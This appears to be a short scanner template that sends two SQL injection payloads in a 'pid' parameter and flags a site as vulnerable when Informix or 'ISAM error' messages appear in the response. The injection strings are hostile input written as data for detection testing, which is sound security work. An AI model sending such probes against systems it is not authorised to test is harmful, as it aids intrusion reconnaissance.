id: sqli6-informix-20
name: 'SQLi informix probe in pid'
severity: high
type: active
tags:
  - sqli
  - injection
  - informix
description: 'Triggers informix error via pid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      pid:
        - '1'' ORDER BY 1--'
        - '''||''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Informix'
          - 'ISAM error'
